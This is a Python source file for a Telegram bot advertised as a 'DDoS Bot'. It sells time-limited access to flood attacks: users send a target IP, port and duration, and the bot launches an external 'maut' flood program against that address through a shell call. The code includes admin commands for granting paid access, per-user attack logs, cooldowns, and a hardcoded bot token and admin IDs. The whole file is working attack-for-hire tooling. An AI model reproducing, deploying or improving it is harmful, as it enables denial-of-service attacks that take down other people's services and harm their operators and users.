import telebot
import subprocess
import datetime
import os
from telebot import types
import time
import re
from threading import Lock

# Bot configuration
bot = telebot.TeleBot('7974098970:AAGiPoFmcmvrZZ1YqzhbMqaOOxd23CaPocc')
admin_ids = ["6525686565", "7017469802"]  # Fixed admin IDs as list of strings
USER_FILE = "users.txt"
USER_TIME_LIMITS = "user_limits.txt"
LOG_FILE = "attack_logs.txt"
COOLDOWN_TIME = 400  # 5 minutes
MAX_ATTACK_TIME = 200  # 3 minutes
IMAGE_URL = "https://t.me/gggkkkggggiii/10"

# Data storage
user_attack_data = {}
maut_cooldown = {}
allowed_user_ids = []
user_time_limits = {}
active_attacks = {}  # Track active attacks
attack_lock = Lock()  # Thread lock for attack operations

def load_users():
    global allowed_user_ids, user_time_limits
    try:
        with open(USER_FILE, "r") as f:
            allowed_user_ids = f.read().splitlines()
    except FileNotFoundError:
        allowed_user_ids = []
    
    try:
        with open(USER_TIME_LIMITS, "r") as f:
            for line in f:
                user_id, limit_sec, expiry = line.strip().split("|")
                user_time_limits[user_id] = (int(limit_sec), float(expiry))
    except FileNotFoundError:
        user_time_limits = {}

def save_users():
    with open(USER_FILE, "w") as f:
        f.write("\n".join(allowed_user_ids))
    
    with open(USER_TIME_LIMITS, "w") as f:
        for user_id, (limit_sec, expiry) in user_time_limits.items():
            f.write(f"{user_id}|{limit_sec}|{expiry}\n")

def log_attack(user_id, target, port, time):
    try:
        user = bot.get_chat(user_id)
        username = f"@{user.username}" if user.username else f"ID:{user_id}"
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.datetime.now()} | {username} | {target}:{port} | {time}s\n")
    except Exception as e:
        print(f"Logging error: {e}")

def parse_time_input(time_str):
    time_str = time_str.lower()
    total_seconds = 0
    
    matches = re.findall(r'(\d+)\s*(day|hour|min|sec|d|h|m|s)', time_str)
    
    for amount, unit in matches:
        amount = int(amount)
        if unit in ['day', 'd']:
            total_seconds += amount * 86400
        elif unit in ['hour', 'h']:
            total_seconds += amount * 3600
        elif unit in ['min', 'm']:
            total_seconds += amount * 60
        elif unit in ['sec', 's']:
            total_seconds += amount
    
    return total_seconds if total_seconds > 0 else None

def is_attack_active():
    with attack_lock:
        return bool(active_attacks)

def add_active_attack(user_id, attack_time):
    with attack_lock:
        active_attacks[user_id] = {
            'start_time': datetime.datetime.now(),
            'duration': attack_time
        }

def remove_active_attack(user_id):
    with attack_lock:
        if user_id in active_attacks:
            del active_attacks[user_id]

def get_active_attack_info():
    with attack_lock:
        if not active_attacks:
            return None
        user_id, attack = next(iter(active_attacks.items()))
        elapsed = (datetime.datetime.now() - attack['start_time']).seconds
        remaining = max(0, attack['duration'] - elapsed)
        return user_id, remaining

@bot.message_handler(commands=['start'])
def start_command(message):
    caption = """
🚀 *Welcome to Ansh DDoS Bot* 🚀

*Available Commands:*
/maut <ip> <port> <time> - Start attack
/mylogs - View your attack history
/help - Show all commands
/rules - Usage guidelines

*Admin Commands:*
/add <user_id> <time> - Add user
/remove <user_id> - Remove user
/allusers - List all users
/logs - View all attack logs
/clearlogs - Clear logs

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    try:
        bot.send_photo(
            chat_id=message.chat.id,
            photo=IMAGE_URL,
            caption=caption,
            parse_mode="Markdown"
        )
    except Exception as e:
        bot.reply_to(message, caption, parse_mode="Markdown")
        print(f"Error sending image: {e}")

@bot.message_handler(commands=['maut'])
def handle_attack_command(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, "❌ Access denied. `@IN_272`.")
    
    # Check if another attack is active
    active_info = get_active_attack_info()
    if active_info:
        active_user_id, remaining = active_info
        try:
            active_user = bot.get_chat(active_user_id)
            username = f"@{active_user.username}" if active_user.username else f"ID:{active_user_id}"
            return bot.reply_to(message, f"⚠️ Attack in progress by {username}. Please wait {remaining} seconds.")
        except:
            return bot.reply_to(message, f"⚠️ Attack in progress. Please wait {remaining} seconds.")
    
    # Check cooldown
    if user_id in maut_cooldown:
        remaining = COOLDOWN_TIME - (datetime.datetime.now() - maut_cooldown[user_id]).seconds
        if remaining > 0:
            return bot.reply_to(message, f"⏳ Cooldown active. Wait {remaining} seconds.")
    
    # Check time limit if exists
    if user_id in user_time_limits:
        limit_sec, expiry = user_time_limits[user_id]
        if time.time() > expiry:
            del user_time_limits[user_id]
            save_users()
            allowed_user_ids.remove(user_id)
            return bot.reply_to(message, "❌ Your access has expired. Contact admin.")
    
    # Parse command
    try:
        args = message.text.split()
        if len(args) != 4:
            return bot.reply_to(message, "❌ Usage: /maut <ip> <port> <time>\nExample: /maut 1.1.1.1 80 60")
        
        ip = args[1]
        port = args[2]
        attack_time = args[3]
        
        # Validate IP
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
            return bot.reply_to(message, "❌ Invalid IP format. Example: 1.1.1.1")
        
        # Validate port
        if not port.isdigit() or not 1 <= int(port) <= 65535:
            return bot.reply_to(message, "❌ Invalid port (1-65535)")
        
        # Validate time
        if not attack_time.isdigit() or not 1 <= int(attack_time) <= MAX_ATTACK_TIME:
            return bot.reply_to(message, f"❌ Invalid time (1-{MAX_ATTACK_TIME}s)")
        
        # Store attack data
        user_attack_data[user_id] = {
            'ip': ip,
            'port': port,
            'time': attack_time
        }
        
        # Show confirmation
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ Start Attack", callback_data="start_attack"),
            types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
        )
        
        bot.send_message(
            message.chat.id,
            f"⚡ *Attack Summary:*\n\n"
            f"🌐 IP: `{ip}`\n"
            f"🔌 Port: `{port}`\n"
            f"⏱ Time: `{attack_time}`s\n\n"
            f"Confirm attack:",
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    user_id = str(call.message.chat.id)
    
    if call.data == "start_attack":
        if user_id not in user_attack_data:
            return bot.answer_callback_query(call.id, "❌ Session expired. Use /maut")
        
        data = user_attack_data[user_id]
        try:
            # Mark attack as active
            add_active_attack(user_id, int(data['time']))
            
            # Execute attack
            subprocess.Popen(f"./maut {data['ip']} {data['port']} {data['time']} 900", shell=True)
            log_attack(user_id, data['ip'], data['port'], data['time'])
            maut_cooldown[user_id] = datetime.datetime.now()
            
            # Update message
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"🔥 *Attack Launched!* 🔥\n\n"
                     f"🌐 Target: `{data['ip']}`\n"
                     f"🔌 Port: `{data['port']}`\n"
                     f"⏱ Duration: `{data['time']}`s\n\n"
                     f"[⚡ Powered by @@IN_272](tg://openmessage?user_id=6525686565)",
                parse_mode="Markdown"
            )
            
            # Schedule attack completion message
            attack_duration = int(data['time'])
            time.sleep(attack_duration)
            
            # Send completion message
            bot.send_message(
                call.message.chat.id,
                f"✅ *Attack Completed!*\n\n"
                f"🌐 Target: `{data['ip']}`\n"
                f"⏱ Duration: `{data['time']}`s\n\n"
                f"Cooldown: {COOLDOWN_TIME//60} minutes",
                parse_mode="Markdown"
            )
            
            # Remove from active attacks
            remove_active_attack(user_id)
            
            # Add new attack button
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
            bot.send_message(call.message.chat.id, "Attack finished! You can launch a new one when cooldown ends.", reply_markup=markup)
            
        except Exception as e:
            remove_active_attack(user_id)
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"❌ Error: {str(e)}"
            )
    
    elif call.data == "cancel_attack":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="❌ Attack cancelled"
        )
    
    elif call.data == "new_attack":
        if user_id in maut_cooldown:
            remaining = COOLDOWN_TIME - (datetime.datetime.now() - maut_cooldown[user_id]).seconds
            if remaining > 0:
                return bot.answer_callback_query(call.id, f"⏳ Wait {remaining} seconds")
        
        bot.send_message(call.message.chat.id, "⚡ Send new attack command:\n`/maut <ip> <port> <time>`", parse_mode="Markdown")
    
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_ids:  # Fixed admin check
        return bot.reply_to(message, "❌ Admin only command.")
    
    try:
        args = message.text.split(maxsplit=2)
        if len(args) < 3:
            return bot.reply_to(message, "❌ Usage: /add <user_id> <time_limit>\nExample: /add 123456 1day2hours")
        
        new_user = args[1]
        time_limit = args[2]
        
        if new_user in allowed_user_ids:
            return bot.reply_to(message, "ℹ️ User already exists.")
        
        limit_seconds = parse_time_input(time_limit)
        if not limit_seconds:
            return bot.reply_to(message, "❌ Invalid time format. Use like: 1day, 2hours30min")
        
        expiry_timestamp = time.time() + limit_seconds
        user_time_limits[new_user] = (limit_seconds, expiry_timestamp)
        allowed_user_ids.append(new_user)
        save_users()
        
        # Format time for response
        days = limit_seconds // 86400
        hours = (limit_seconds % 86400) // 3600
        minutes = (limit_seconds % 3600) // 60
        
        time_str = []
        if days: time_str.append(f"{days} day{'s' if days>1 else ''}")
        if hours: time_str.append(f"{hours} hour{'s' if hours>1 else ''}")
        if minutes: time_str.append(f"{minutes} minute{'s' if minutes>1 else ''}")
        
        bot.reply_to(message, f"✅ User {new_user} added with limit: {' '.join(time_str)}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}\nUsage: /add <user_id> <time_limit>\nExample: /add 123456 1day2hours")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_ids:  # Fixed admin check
        return bot.reply_to(message, "❌ Admin only command.")
    
    try:
        user_to_remove = message.text.split()[1]
        if user_to_remove not in allowed_user_ids:
            return bot.reply_to(message, "❌ User not found.")
        
        allowed_user_ids.remove(user_to_remove)
        if user_to_remove in user_time_limits:
            del user_time_limits[user_to_remove]
        save_users()
        bot.reply_to(message, f"✅ User {user_to_remove} removed.")
    except:
        bot.reply_to(message, "❌ Usage: /remove <user_id>")

@bot.message_handler(commands=['allusers'])
def list_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_ids:  # Fixed admin check
        return bot.reply_to(message, "❌ Admin only command.")
    
    if not allowed_user_ids:
        return bot.reply_to(message, "ℹ️ No users found.")
    
    users_list = []
    now = time.time()
    
    for user in allowed_user_ids:
        if user in user_time_limits:
            limit_sec, expiry = user_time_limits[user]
            if now < expiry:
                remaining = expiry - now
                days = int(remaining // 86400)
                hours = int((remaining % 86400) // 3600)
                mins = int((remaining % 3600) // 60)
                users_list.append(f"🟢 {user} (Expires in: {days}d {hours}h {mins}m)")
            else:
                users_list.append(f"🔴 {user} (Expired)")
        else:
            users_list.append(f"🟡 {user} (No limit)")
    
    bot.reply_to(message, "👥 Authorized Users:\n\n" + "\n".join(users_list))

@bot.message_handler(commands=['logs'])
def show_logs(message):
    user_id = str(message.chat.id)
    if user_id not in admin_ids:  # Fixed admin check
        return bot.reply_to(message, "❌ Admin only command.")
    
    if not os.path.exists(LOG_FILE):
        return bot.reply_to(message, "ℹ️ No logs available.")
    
    with open(LOG_FILE, "rb") as f:
        bot.send_document(message.chat.id, f)

@bot.message_handler(commands=['clearlogs'])
def clear_logs(message):
    user_id = str(message.chat.id)
    if user_id not in admin_ids:  # Fixed admin check
        return bot.reply_to(message, "❌ Admin only command.")
    
    try:
        with open(LOG_FILE, "w"):
            pass
        bot.reply_to(message, "✅ Logs cleared.")
    except:
        bot.reply_to(message, "❌ Error clearing logs.")

@bot.message_handler(commands=['mylogs'])
def my_logs(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        return bot.reply_to(message, "❌ Access denied.")
    
    if not os.path.exists(LOG_FILE):
        return bot.reply_to(message, "ℹ️ No attack history.")
    
    user_logs = []
    with open(LOG_FILE, "r") as f:
        for line in f:
            if str(user_id) in line or (message.from_user.username and f"@{message.from_user.username}" in line):
                user_logs.append(line)
    
    if not user_logs:
        return bot.reply_to(message, "ℹ️ No attacks found in your history.")
    
    bot.reply_to(message, f"📜 Your Attack History:\n\n" + "".join(user_logs[-10:]))

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
🛠 *Ansh Bot Help* 🛠

*User Commands:*
/maut <ip> <port> <time> - Start attack
/mylogs - View your history
/rules - Usage guidelines

*Admin Commands:*
/add <user_id> <time> - Add user
/remove <user_id> - Remove user
/allusers - List users
/logs - View all logs
/clearlogs - Clear logs

⚡ *Example Attack:*
`/maut 1.1.1.1 80 60`
"""
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules = """
📜 *Usage Rules* 📜

1. Max attack time: 180 seconds
2. 5 minutes cooldown
3. No concurrent attacks
4. No illegal targets

Violations will result in ban.
"""
    bot.reply_to(message, rules, parse_mode="Markdown")

# Initialize
load_users()

# Start bot
print("⚡ MAUT Bot Started ⚡")
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
